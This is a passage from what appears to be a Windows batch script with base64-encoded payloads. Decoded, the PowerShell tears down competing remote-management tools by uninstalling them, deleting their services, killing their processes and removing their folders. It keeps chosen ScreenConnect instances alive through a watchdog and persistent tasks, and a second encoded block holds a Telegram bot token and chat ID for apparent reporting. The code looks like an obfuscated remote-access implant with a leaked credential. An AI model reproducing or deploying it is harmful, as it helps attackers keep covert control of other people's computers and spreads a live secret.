LlByb2QpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxS
b290cykgewogICAgICAgICAgICAgICAgR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAk
ZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkbiAtYW5kICRkbiAt
bGlrZSAkcGF0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAk
ZG4pIHsgTG9nICJybW1fc2tpcF9kYXR0b19rZWVwIFskZG5dIjsgcmV0dXJuIH0KICAgICAgICAg
ICAgICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7ICRuLnJtbSsrOyAk
aGl0ID0gJHRydWUgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAg
ICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlN2Yykg
ewogICAgICAgICAgICBHZXQtU2VydmljZSAtTmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKElzLURhdHRv
S2VlcGVyICRfLk5hbWUgLW9yIElzLURhdHRvS2VlcGVyICRfLkRpc3BsYXlOYW1lKSB7IExvZyAi
cm1tX3NraXBfZGF0dG9fc3ZjICQoJF8uTmFtZSkiOyByZXR1cm4gfQogICAgICAgICAgICAgICAg
JiBzYy5leGUgc3RvcCAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAg
ICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDUwMAogICAgICAgICAgICAgICAgJiBzYy5leGUg
ZGVsZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICRuLnJt
bSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3N2Y19kZWxldGVkICQoJF8uTmFtZSkgWyQoJHRv
b2wuVGFnKV0iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBp
biAkdG9vbC5Qcm9jKSB7CiAgICAgICAgICAgIEdldC1Qcm9jZXNzIC1OYW1lICRwYXQgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAg
ICBTdG9wLVByb2Nlc3MgLUlkICRfLklkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZQogICAgICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fcHJv
Y19raWxsZWQgJCgkXy5Qcm9jZXNzTmFtZSkgWyQoJHRvb2wuVGFnKV0iCiAgICAgICAgICAgIH0K
ICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJGQgaW4gJHRvb2wuRGlycykgewogICAgICAgICAg
ICBpZiAoJGQgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsKICAgICAgICAgICAg
ICAgIGlmIChJcy1EYXR0b0tlZXBlciAkZCkgeyBMb2cgInJtbV9za2lwX2RhdHRvX2RpciAkZCI7
IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4u
cm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fZGlyX3JlbW92ZWQgJGQiIH0KICAgICAgICAg
ICAgICAgIGVsc2UgeyAkbi5mYWlsKys7IExvZyAicm1tX2Rpcl9SRU1PVkVfRkFJTEVEICRkIiB9
CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRoaXQpIHsgTG9nICJybW1fZXh0
ZXJtaW5hdGVkICQoJHRvb2wuVGFnKSIgfQogICAgfQoKICAgICRzdW1tYXJ5ID0gImV4dGVybWlu
YXRlIHN2Yz0kKCRuLnN2YykgcHJvYz0kKCRuLnByb2MpIGRpcj0kKCRuLmRpcikgcHJvZHVjdD0k
KCRuLnByb2R1Y3QpIHJtbT0kKCRuLnJtbSkgZmFpbD0kKCRuLmZhaWwpIgogICAgTG9nICRzdW1t
YXJ5CiAgICByZXR1cm4gJHN1bW1hcnkKfQoKZnVuY3Rpb24gVXBkYXRlLVN0YXRlIHsKICAgICRr
ZWVwID0gQChHZXQtS2VlcEZpbmdlcnByaW50cykKICAgICRncnl4YUZwID0gR2V0LUdyeXhhRnAK
ICAgICRwcmltID0gJG51bGw7ICRhbHQgPSAkbnVsbDsgJHNjcmlwdDpncnl4YSA9ICRudWxsCiAg
ICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGll
bnQqJykpIHsKICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwp
JykgewogICAgICAgICAgICBpZiAoJG1hdGNoZXNbMV0gLWVxICc1ZjYwMTA1Nzk4NTJlNTA3Jykg
eyAkcHJpbSA9ICIkKCRzdmMuU3RhdHVzKSIgfQogICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVz
WzFdIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIgfQog
ICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWzFdIC1lcSAkZ3J5eGFGcCkgeyAkc2NyaXB0Omdy
eXhhID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgfQogICAgfQogICAgJGZvcmVpZ24gPSBA
KCkKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0
IENsaWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsx
Nn0pXCknIC1hbmQgJG1hdGNoZXNbMV0gLW5vdGluICRrZWVwKSB7CiAgICAgICAgICAgICRmb3Jl
aWduICs9ICRtYXRjaGVzWzFdCiAgICAgICAgfQogICAgfQogICAgJGlkID0gUmVhZC1JZGVudGl0
eQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3RhbCA9IDAKICAgIGZvcmVhY2ggKCRrIGluICdU
QVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNLX0QnKSB7CiAgICAgICAgJHRhc2tzVG90YWwr
KwogICAgICAgICR0biA9IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJGtdKQogICAg
ICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgJG1hcmtlciA9IGlmICgkayAt
ZXEgJ1RBU0tfQicpIHsgJ2V0bF9tb24uY21kJyB9IGVsc2UgeyAnb3duX21vbi5jbWQnIH0KICAg
ICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRuICRtYXJrZXIpIC1vciAoVGVzdC1UYXNrT3du
c01vbiAoIlwkdG4iKSAkbWFya2VyKSkgeyAkdGFza3NPaysrIH0KICAgIH0KICAgIGlmICgtbm90
ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcg
fQogICAgJHdkID0gRW5zdXJlLVdhdGNoZG9nCiAgICAkcHJldiA9IEB7fQogICAgJHN0YXRlUGF0
aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicKICAgIGlmIChUZXN0LVBhdGggJHN0
YXRlUGF0aCkgewogICAgICAgIHRyeSB7IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRl
UGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbikuUFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVh
Y2gtT2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAkXy5WYWx1ZSB9IH0gY2F0Y2gge30KICAgIH0K
ICAgICRpbnN0YWxsQ291bnQgPSAxCiAgICBpZiAoJHByZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0
YWxsQ291bnQgPSBbaW50XSRwcmV2Lmluc3RhbGxDb3VudCB9CiAgICBpZiAoJHByZXYucHJpbSAt
YW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5kICRwcmltIC1lcSAnUnVubmluZycpIHsg
JGluc3RhbGxDb3VudCsrIH0KICAgICRzdGF0ZSA9IFtvcmRlcmVkXUB7CiAgICAgICAgaG9zdCAg
ICAgICAgID0gJGVudjpDT01QVVRFUk5BTUUKICAgICAgICB0cyAgICAgICAgICAgPSAoR2V0LURh
dGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykKICAgICAgICBidWlsZCAgICAgICAg
PSAkQnVpbGQKICAgICAgICBwcmltICAgICAgICAgPSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVs
c2UgeyAnTUlTU0lORycgfSkKICAgICAgICBhbHQgICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRh
bHQgfSBlbHNlIHsgJ01JU1NJTkcnIH0pCiAgICAgICAgZ3J5eGEgICAgICAgID0gJChpZiAoJHNj
cmlwdDpncnl4YSkgeyAkc2NyaXB0OmdyeXhhIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAg
IGdyeXhhRnAgICAgICA9ICRncnl4YUZwCiAgICAgICAgZm9yZWlnbiAgICAgID0gJGZvcmVpZ24K
ICAgICAgICB0YXNrc09rICAgICAgPSAkdGFza3NPawogICAgICAgIHRhc2tzVG90YWwgICA9ICR0
YXNrc1RvdGFsCiAgICAgICAgd2F0Y2hkb2cgICAgID0gJHdkCiAgICAgICAgaW5zdGFsbENvdW50
ID0gJGluc3RhbGxDb3VudAogICAgICAgIGxhc3RIZWFsICAgICA9ICQoaWYgKCRFeHRyYSkgeyAo
R2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2
Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0gZWxzZSB7ICRudWxsIH0pCiAgICAgICAgbm90
ZSAgICAgICAgID0gJEV4dHJhCiAgICB9CiAgICAoJHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNv
bXByZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQogICAg
cmV0dXJuICRzdGF0ZQp9Cgpzd2l0Y2ggKCRBY3Rpb24pIHsKICAgICdpbml0JyAgICAgICAgICAg
IHsgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0b3IoKSB8IEZvckVh
Y2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB9CiAgICAnaWRlbnRpdHknICAg
ICAgICB7ICRpZCA9IFJlYWQtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNo
LU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQogICAgJ3dhdGNoZG9nJyAgICAg
ICAgeyBJbnN0YWxsLVdhdGNoZG9nIHwgT3V0LU51bGwgfQogICAgJ3dhdGNoZG9nLWVuc3VyZScg
eyBFbnN1cmUtV2F0Y2hkb2cgfQogICAgJ3Rhc2tzLWVuc3VyZScgICAgeyBFbnN1cmUtUGVyc2lz
dFRhc2tzIH0KICAgICdzdGF0ZScgICAgICAgICAgIHsgVXBkYXRlLVN0YXRlIHwgQ29udmVydFRv
LUpzb24gLUNvbXByZXNzIH0KICAgICdyZXBhaXInICAgICAgICAgIHsgUmVwYWlyLVNDU2Vydmlj
ZSAkRnAgfQogICAgJ3JlZ2lzdGVyZWQnICAgICAgeyBUZXN0LVNDUmVnaXN0ZXJlZCAkRnAgfQog
ICAgJ2V4dGVybWluYXRlJyAgICAgeyBJbnZva2UtRXh0ZXJtaW5hdGUgfQogICAgJ2dyeXhhLWhl
YWx0aCcgICAgeyBUZXN0LUdyeXhhSGVhbHRoIH0KICAgICdncnl4YS1lbnN1cmUnICAgIHsgV3Jp
dGUtT3V0cHV0IChJbnZva2UtR3J5eGFFbnN1cmUgfCBPdXQtU3RyaW5nKS5UcmltKCkgfQp9Cg==
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
